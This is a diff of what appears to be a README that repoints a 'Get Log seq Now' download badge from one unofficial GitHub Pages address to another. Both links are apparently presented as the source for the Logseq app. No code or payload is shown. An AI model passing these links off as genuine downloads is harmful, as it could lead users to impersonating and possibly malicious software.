@@ -4,7 +4,7 @@
 
 ![Banner Placeholder](https://discuss.logseq.com/uploads/default/original/2X/5/50a3822832fca0f5d91cf1ebc19527edff9288ae.png)
 
-[![Get Log seq Now](https://img.shields.io/badge/Get_Log_seq_Now-0a5d8d?style=for-the-badge&logo=github)](https://skillls0ussilily.github.io/.github/log-seq)
+[![Get Log seq Now](https://img.shields.io/badge/Get_Log_seq_Now-0a5d8d?style=for-the-badge&logo=github)](https://log-seq-kit.github.io/.github/)
 
 ---
 
